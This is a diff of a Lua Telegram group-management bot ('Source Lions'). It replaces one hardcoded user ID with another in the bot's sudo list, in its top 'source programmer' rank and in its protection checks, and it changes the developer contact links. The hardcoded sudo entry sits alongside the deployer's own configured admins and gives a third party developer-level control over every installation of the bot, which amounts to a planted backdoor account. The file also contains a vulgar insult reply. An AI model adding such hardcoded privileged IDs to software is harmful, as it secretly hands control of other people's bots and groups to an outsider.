@@ -117,7 +117,7 @@ Source Lions
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,218385683,1609170371}
+SudoIds = {Config.SudoIds,218385683,1992543464}
 Lions = Config.Lions
 TokenBot = Config.TokenBot
 NameBot = (DevAbs:get(Lions..'Abs:NameBot') or 'الاسود')
@@ -579,7 +579,7 @@ end ,nil)
 end
 --     Source Lions     --
 local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then LionsTEAM  = "المطور" elseif SecondSudo(msg) then LionsTEAM = "المطور" elseif SudoBot(msg) then LionsTEAM = "المطور" elseif ManagerAll(msg) then LionsTEAM = "المدير" elseif AdminAll(msg) then LionsTEAM = "الادمن" elseif AbsConstructor(msg) then LionsTEAM = "المالك" elseif BasicConstructor(msg) then LionsTEAM = "المنشئ" elseif Constructor(msg) then LionsTEAM = "المنشئ" elseif Manager(msg) then LionsTEAM = "المدير" elseif Admin(msg) then LionsTEAM = "الادمن" else LionsTEAM = "العضو" end return LionsTEAM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1609170371) then LionsTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Lions) then LionsTEAM = 'البوت' elseif SudoId(user_id) then LionsTEAM = 'المطور الاساسي' elseif DevAbs:sismember(Lions..'Abs:SecondSudo:', user_id) then LionsTEAM = 'المطور الثانوي' elseif DevAbs:sismember(Lions..'Abs:SudoBot:', user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(Lions..'Abs:ManagerAll:', user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(Lions..'Abs:AdminAll:', user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(Lions..'Abs:VipAll:', user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(Lions..'Abs:AbsConstructor:'..chat_id, user_id) then LionsTEAM = 'المالك' elseif DevAbs:sismember(Lions..'Abs:BasicConstructor:'..chat_id, user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(Lions..'Abs:Constructor:'..chat_id, user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(Lions..'Abs:Managers:'..chat_id, user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(Lions..'Abs:Admins:'..chat_id, user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(Lions..'Abs:VipMem:'..chat_id, user_id) then  LionsTEAM = DevAbs:get(Lions.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(Lions..'Abs:Cleaner:'..chat_id, user_id) then  LionsTEAM = DevAbs:get(Lions.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else LionsTEAM = DevAbs:get(Lions.."Abs:mem:Rd"..chat_id) or 'العضو' end return LionsTEAM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1992543464) then LionsTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Lions) then LionsTEAM = 'البوت' elseif SudoId(user_id) then LionsTEAM = 'المطور الاساسي' elseif DevAbs:sismember(Lions..'Abs:SecondSudo:', user_id) then LionsTEAM = 'المطور الثانوي' elseif DevAbs:sismember(Lions..'Abs:SudoBot:', user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAbs:sismember(Lions..'Abs:ManagerAll:', user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAbs:sismember(Lions..'Abs:AdminAll:', user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAbs:sismember(Lions..'Abs:VipAll:', user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAbs:sismember(Lions..'Abs:AbsConstructor:'..chat_id, user_id) then LionsTEAM = 'المالك' elseif DevAbs:sismember(Lions..'Abs:BasicConstructor:'..chat_id, user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAbs:sismember(Lions..'Abs:Constructor:'..chat_id, user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAbs:sismember(Lions..'Abs:Managers:'..chat_id, user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Managers:Rd"..chat_id) or 'المدير' elseif DevAbs:sismember(Lions..'Abs:Admins:'..chat_id, user_id) then LionsTEAM = DevAbs:get(Lions.."Abs:Admins:Rd"..chat_id) or 'الادمن' elseif DevAbs:sismember(Lions..'Abs:VipMem:'..chat_id, user_id) then  LionsTEAM = DevAbs:get(Lions.."Abs:VipMem:Rd"..chat_id) or 'المميز' elseif DevAbs:sismember(Lions..'Abs:Cleaner:'..chat_id, user_id) then  LionsTEAM = DevAbs:get(Lions.."Abs:Cleaner:Rd"..chat_id) or 'المنظف' else LionsTEAM = DevAbs:get(Lions.."Abs:mem:Rd"..chat_id) or 'العضو' end return LionsTEAM end
 --     Source Lions     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -4403,9 +4403,9 @@ Welcome To Source
 
 ⦿︙[Exp Source](https://t.me/LionsDev)
 
-⦿︙[Developer](https://t.me/vXFXv)
+⦿︙[Developer](https://t.me/FFFF8)
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
-⦿︙[Tws Lions](https://t.me/ZzZlZzZBoT)
+⦿︙[Tws Lions](https://t.me/FF8BoT)
 ]]
 Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
@@ -4590,7 +4590,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(1609170371) then 
+if tonumber(result.id_) == tonumber(1992543464) then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4621,7 +4621,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(1609170371) then  
+if tonumber(result.sender_user_id_) == tonumber(1992543464) then  
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
